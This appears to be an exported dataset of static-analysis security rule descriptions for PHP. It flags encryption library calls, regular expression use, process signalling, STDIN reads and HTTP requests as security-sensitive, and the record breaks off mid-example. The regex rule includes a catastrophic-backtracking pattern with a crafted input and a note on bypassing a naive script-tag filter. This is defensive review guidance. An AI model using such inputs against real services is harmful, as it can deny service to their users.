</pre>
<p>PHP-Encryption library</p>
<pre>
use Defuse\Crypto\Crypto;
use Defuse\Crypto\File;

function mypPhpEncryption($data, $key, $password, $inputFilename, $outputFilename, $inputHandle, $outputHandle) {
    Crypto::encrypt($data, $key); // Questionable
    Crypto::encryptWithPassword($data, $password); // Questionable
    File::encryptFile($inputFilename, $outputFilename, $key); // Questionable
    File::encryptFileWithPassword($inputFilename, $outputFilename, $password); // Questionable
    File::encryptResource($inputHandle, $outputHandle, $key); // Questionable
    File::encryptResourceWithPassword($inputHandle, $outputHandle, $password); // Questionable
}
</pre>
<p>PhpSecLib</p>
<pre>
function myphpseclib($mode) {
    new phpseclib\Crypt\RSA(); // Questionable. Note: RSA can also be used for signing data.
    new phpseclib\Crypt\AES(); // Questionable
    new phpseclib\Crypt\Rijndael(); // Questionable
    new phpseclib\Crypt\Twofish(); // Questionable
    new phpseclib\Crypt\Blowfish(); // Questionable
    new phpseclib\Crypt\RC4(); // Questionable
    new phpseclib\Crypt\RC2(); // Questionable
    new phpseclib\Crypt\TripleDES(); // Questionable
    new phpseclib\Crypt\DES(); // Questionable

    new phpseclib\Crypt\AES($mode); // Questionable
    new phpseclib\Crypt\Rijndael($mode); // Questionable
    new phpseclib\Crypt\TripleDES($mode); // Questionable
    new phpseclib\Crypt\DES($mode); // Questionable
}
</pre>
<p>Sodium Compat library</p>
<pre>
function mySodiumCompatEncrypt($data, $ad, $nonce, $key) {
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_aead_xchacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_encrypt($data, $ad, $nonce, $key); // Questionable

    ParagonIE_Sodium_Compat::crypto_aead_aes256gcm_encrypt($data, $ad, $nonce, $key); // Questionable

    ParagonIE_Sodium_Compat::crypto_box($data, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_secretbox($data, $nonce, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_box_seal($data, $key); // Questionable
    ParagonIE_Sodium_Compat::crypto_secretbox_xchacha20poly1305($data, $nonce, $key); // Questionable
}
</pre>
<p>Yii version 2</p>
<pre>
use Yii;

// Similar to CraftCMS as it uses Yii
function YiiEncrypt($data, $key, $password) {
    Yii::$app-&gt;security-&gt;encryptByKey($data, $key); // Questionable
    Yii::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Questionable
    Yii::$app-&gt;security-&gt;encryptByPassword($data, $password); // Questionable
    Yii::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Questionable
}
</pre>
<p>Zend</p>
<pre>
use Zend\Crypt\FileCipher;
use Zend\Crypt\PublicKey\DiffieHellman;
use Zend\Crypt\PublicKey\Rsa;
use Zend\Crypt\Hybrid;
use Zend\Crypt\BlockCipher;

function myZendEncrypt($key, $data, $prime, $options, $generator, $lib)
{
    new FileCipher; // Questionable. This is used to encrypt files

    new DiffieHellman($prime, $generator, $key); // Questionable

    $rsa = Rsa::factory([ // Questionable
        'public_key'    =&gt; 'public_key.pub',
        'private_key'   =&gt; 'private_key.pem',
        'pass_phrase'   =&gt; 'mypassphrase',
        'binary_output' =&gt; false,
    ]);
    $rsa-&gt;encrypt($data); // No issue raised here. The configuration of the Rsa object is the line to review.

    $hybrid = new Hybrid(); // Questionable

    BlockCipher::factory($lib, $options); // Questionable
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Encrypting data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution, which means that an issue will be created whenever one of the following function is called:</p>
<ul>
  <li> <a href=""http://php.net/manual/en/book.pcre.php"">PCRE</a>: Perl style regular expressions: <a
  href=""http://php.net/manual/en/function.preg-filter.php"">preg_filter</a>, <a href=""http://php.net/manual/en/function.preg-grep.php"">preg_grep</a>,
  <a href=""http://php.net/manual/en/function.preg-match-all.php"">preg_match_all</a>, <a
  href=""http://php.net/manual/en/function.preg-match.php"">preg_match</a>, <a
  href=""http://php.net/manual/en/function.preg-replace-callback-array.php"">preg_replace_callback_array</a>, <a
  href=""http://php.net/manual/en/function.preg-replace-callback.php"">preg_replace_callback</a>, <a
  href=""http://php.net/manual/en/function.preg-replace.php"">preg_replace</a>, <a
  href=""http://php.net/manual/en/function.preg-split.php"">preg_split</a> </li>
  <li> <a href=""http://php.net/manual/en/book.regex.php"">POSIX extended</a>, which are deprecated: <a
  href=""http://php.net/manual/en/function.ereg-replace.php"">ereg_replace</a>, <a href=""http://php.net/manual/en/function.ereg.php"">ereg</a>, <a
  href=""http://php.net/manual/en/function.eregi-replace.php"">eregi_replace</a>, <a href=""http://php.net/manual/en/function.eregi.php"">eregi</a>, <a
  href=""http://php.net/manual/en/function.split.php"">split</a>, <a href=""http://php.net/manual/en/function.spliti.php"">spliti</a>. </li>
  <li> <a href=""http://php.net/manual/en/function.fnmatch.php"">fnmatch</a> </li>
  <li> Any of the multibyte string regular expressions: <a href=""http://php.net/manual/en/function.mb-eregi-replace.php"">mb_eregi_replace</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-match.php"">mb_ereg_match</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-replace-callback.php"">mb_ereg_replace_callback</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-replace.php"">mb_ereg_replace</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search-init.php"">mb_ereg_search_init</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search-pos.php"">mb_ereg_search_pos</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search-regs.php"">mb_ereg_search_regs</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search.php"">mb_ereg_search</a>, <a href=""http://php.net/manual/en/function.mb-ereg.php"">mb_ereg</a>,
  <a href=""http://php.net/manual/en/function.mb-eregi-replace.php"">mb_eregi_replace</a>, <a
  href=""http://php.net/manual/en/function.mb-eregi.php"">mb_eregi</a> </li>
</ul>
<p>Note that <code>ereg*</code> functions have been removed in PHP 7 and <strong>PHP 5 end of life date is the 1st of January 2019. Using PHP 5 after
this date is dangerous as there will be no security fix</strong>.</p>
<p>This rule's goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression or use at least <code>preg_quote</code> to escape regular expression characters.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Exceptions</h2>
<p>An issue will be created for the functions <code>mb_ereg_search_pos</code>, <code>mb_ereg_search_regs</code> and <code>mb_ereg_search</code> if and
only if at least the first argument, i.e. the $pattern, is provided.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",php:S4784,php,PHP,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution, which means that an issue will be created whenever one of the following function is called:</p>
<ul>
  <li> <a href=""http://php.net/manual/en/book.pcre.php"">PCRE</a>: Perl style regular expressions: <a
  href=""http://php.net/manual/en/function.preg-filter.php"">preg_filter</a>, <a href=""http://php.net/manual/en/function.preg-grep.php"">preg_grep</a>,
  <a href=""http://php.net/manual/en/function.preg-match-all.php"">preg_match_all</a>, <a
  href=""http://php.net/manual/en/function.preg-match.php"">preg_match</a>, <a
  href=""http://php.net/manual/en/function.preg-replace-callback-array.php"">preg_replace_callback_array</a>, <a
  href=""http://php.net/manual/en/function.preg-replace-callback.php"">preg_replace_callback</a>, <a
  href=""http://php.net/manual/en/function.preg-replace.php"">preg_replace</a>, <a
  href=""http://php.net/manual/en/function.preg-split.php"">preg_split</a> </li>
  <li> <a href=""http://php.net/manual/en/book.regex.php"">POSIX extended</a>, which are deprecated: <a
  href=""http://php.net/manual/en/function.ereg-replace.php"">ereg_replace</a>, <a href=""http://php.net/manual/en/function.ereg.php"">ereg</a>, <a
  href=""http://php.net/manual/en/function.eregi-replace.php"">eregi_replace</a>, <a href=""http://php.net/manual/en/function.eregi.php"">eregi</a>, <a
  href=""http://php.net/manual/en/function.split.php"">split</a>, <a href=""http://php.net/manual/en/function.spliti.php"">spliti</a>. </li>
  <li> <a href=""http://php.net/manual/en/function.fnmatch.php"">fnmatch</a> </li>
  <li> Any of the multibyte string regular expressions: <a href=""http://php.net/manual/en/function.mb-eregi-replace.php"">mb_eregi_replace</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-match.php"">mb_ereg_match</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-replace-callback.php"">mb_ereg_replace_callback</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-replace.php"">mb_ereg_replace</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search-init.php"">mb_ereg_search_init</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search-pos.php"">mb_ereg_search_pos</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search-regs.php"">mb_ereg_search_regs</a>, <a
  href=""http://php.net/manual/en/function.mb-ereg-search.php"">mb_ereg_search</a>, <a href=""http://php.net/manual/en/function.mb-ereg.php"">mb_ereg</a>,
  <a href=""http://php.net/manual/en/function.mb-eregi-replace.php"">mb_eregi_replace</a>, <a
  href=""http://php.net/manual/en/function.mb-eregi.php"">mb_eregi</a> </li>
</ul>
<p>Note that <code>ereg*</code> functions have been removed in PHP 7 and <strong>PHP 5 end of life date is the 1st of January 2019. Using PHP 5 after
this date is dangerous as there will be no security fix</strong>.</p>
<p>This rule's goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression or use at least <code>preg_quote</code> to escape regular expression characters.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Exceptions</h2>
<p>An issue will be created for the functions <code>mb_ereg_search_pos</code>, <code>mb_ereg_search_regs</code> and <code>mb_ereg_search</code> if and
only if at least the first argument, i.e. the $pattern, is provided.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using regular expressions is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Signalling processes is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0390"">CVE-2009-0390</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0839"">CVE-2002-0839</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1671"">CVE-2008-1671</a> </li>
</ul>
<p>Sending signals without checking properly which process will receive it can cause a denial of service.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the PID of the process to which the signal will be sent is coming from an untrusted source. It could for example come from a world-writable
  file. </li>
  <li> users who are asking for the signal to be sent might not have the permission to send those signals. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> If the signal is sent because of a user's request. Check that the user is allowed to send this signal. You can for example forbid it if the
  user doesn't own the process. </li>
  <li> Secure the source from which the process PID is read. </li>
  <li> Run the process sending the signals with minimal permissions. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
posix_kill(42, 42); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/283.html"">MITRE, CWE-283</a> - https://cwe.mitre.org/data/definitions/283.html </li>
</ul>",php:S4828,php,PHP,"<p>Signalling processes is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0390"">CVE-2009-0390</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0839"">CVE-2002-0839</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1671"">CVE-2008-1671</a> </li>
</ul>
<p>Sending signals without checking properly which process will receive it can cause a denial of service.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the PID of the process to which the signal will be sent is coming from an untrusted source. It could for example come from a world-writable
  file. </li>
  <li> users who are asking for the signal to be sent might not have the permission to send those signals. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> If the signal is sent because of a user's request. Check that the user is allowed to send this signal. You can for example forbid it if the
  user doesn't own the process. </li>
  <li> Secure the source from which the process PID is read. </li>
  <li> Run the process sending the signals with minimal permissions. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
posix_kill(42, 42); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/283.html"">MITRE, CWE-283</a> - https://cwe.mitre.org/data/definitions/283.html </li>
</ul>",Signalling processes is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
// Any reference to STDIN is Questionable
$varstdin = STDIN; // Questionable
stream_get_line(STDIN, 40); // Questionable
stream_copy_to_stream(STDIN, STDOUT); // Questionable
// ...


// Except those references as they can't create an injection vulnerability.
ftruncate(STDIN, 5); // OK
ftell(STDIN); // OK
feof(STDIN); // OK
fseek(STDIN, 5); // OK
fclose(STDIN); // OK


// STDIN can also be referenced like this
$mystdin = 'php://stdin'; // Questionable

file_get_contents('php://stdin'); // Questionable
readfile('php://stdin'); // Questionable

$input = fopen('php://stdin', 'r'); // Questionable
fclose($input); // OK
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",php:S4829,php,PHP,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
// Any reference to STDIN is Questionable
$varstdin = STDIN; // Questionable
stream_get_line(STDIN, 40); // Questionable
stream_copy_to_stream(STDIN, STDOUT); // Questionable
// ...


// Except those references as they can't create an injection vulnerability.
ftruncate(STDIN, 5); // OK
ftell(STDIN); // OK
feof(STDIN); // OK
fseek(STDIN, 5); // OK
fclose(STDIN); // OK


// STDIN can also be referenced like this
$mystdin = 'php://stdin'; // Questionable

file_get_contents('php://stdin'); // Questionable
readfile('php://stdin'); // Questionable

$input = fopen('php://stdin', 'r'); // Questionable
fclose($input); // OK
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",Reading the Standard Input is security-sensitive,[],CRITICAL,['cwe'],SECURITY_HOTSPOT
2019-01-18T12:20:02+0100,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Builtin functions</p>
<pre>
function sendHttpRequest($url) {
    // The following are questionable when used with a hard coded http or https url. The limitation is to avoid False positives.
    file_get_contents('https://example.com'); // Questionable
    fopen('http://example.com', 'r');  // Questionable
    readfile('http://example.com'); // Questionable
    copy('http://example.com', 'test.txt'); // Questionable
    file('http://example.com'); // Questionable

    // Some of these function also accept a context. When this context is an 'http' context. See above.
    file_get_contents('http://example.com', false, $context); // Questionable
    fopen('http://example.com', 'r', false, $context); // Questionable
    file('http://example.com', 0, $context); // Questionable
    readfile('http://example.com', False, $context); // Questionable

    get_headers('http://example.com'); // Questionable
    get_meta_tags('http://example.com'); // Questionable, when used with a hard coded http or https url. The limitation is to avoid False positives.
}
</pre>
<p>Curl functions</p>
<pre>
$url = 'http://example.com';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
//Execute the request.
$data = curl_exec($ch); // Questionable
curl_close($ch);
</pre>
<p>Guzzle</p>
<pre>
new GuzzleHttp\Client(); // Questionable
</pre>
<p>PECL HTTP</p>
<pre>
new http\Client\Request('GET', 'http://example.com'); // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/200.html"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
</ul>",php:S4825,php,PHP,"<p>Sending HTTP requests is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8150"">CVE-2014-8150</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000007"">CVE-2018-1000007</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0660"">CVE-2010-0660</a> </li>
</ul>
<p>An HTTP request has different kinds of vulnerabilities:</p>
<ul>
  <li> it sends data which might be intercepted or dangerous. </li>
  <li> it receives a response which might have been crafted by an attacker. </li>
  <li> as each request opens a socket and triggers some processing for the sender and the recipient, it is possible to exhaust resources on both sides
  by sending too many requests. </li>
</ul>
<p>This rule flags code that initiates an HTTP request. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the http connection is encrypted or not. </li>
  <li> the recipient is not allowed to receive some of the data you send. </li>
  <li> the data sent might be dangerous (example: it contains unvalidated user input). </li>
  <li> an uncontrolled number of requests might be sent. For example, a request might be sent every time a user performs an action, and this action is
  not limited. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> First, it is important to encrypt all HTTP connection if there is any chance for them to be eavesdropped. Use HTTPS whenever possible. </li>
  <li> Ensure that you control the URIs you send requests to and the number or requests you send. Your software could otherwise be used to attack
  other services. </li>
  <li> Avoid sending sensitive information, be it in the URL, header or body. If part of the data comes from an untrusted source, such as a user
  input, sanitize it beforehand. </li>
  <li> Validate and sanitize the response before using it in any way. </li>
</ul>
<h2>Questionable Code Example</h2>
<p>Builtin functions</p>
<pre>
function sendHttpRequest($url) {
    // The following are questionable when used with a hard coded http or https url. The limitation is to avoid False positives.
    file_get_contents('https://example.com'); // Questionable
    fopen('http://example.com', 'r');  // Questionable
    readfile('http://example.com'); // Questionable
    copy('http://example.com', 'test.txt'); // Questionable
    file('http://example.com'); // Questionable

    // Some of these function also accept a context. When this context is an 'http' context. See above.
    file_get_contents('http://example.com', false, $context); // Questionable
    fopen('http://example.com', 'r', false, $context); // Questionable
    file('http://example.com', 0, $context); // Questionable
    readfile('http://example.com', False, $context); // Questionable

    get_headers('http://example.com'); // Questionable
    get_meta_tags('http://example.com'); // Questionable, when used with a hard coded http or https url. The limitation is to avoid False positives.
}
</pre>
<p>Curl functions</p>
<pre>
$url = 'http://example.com';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
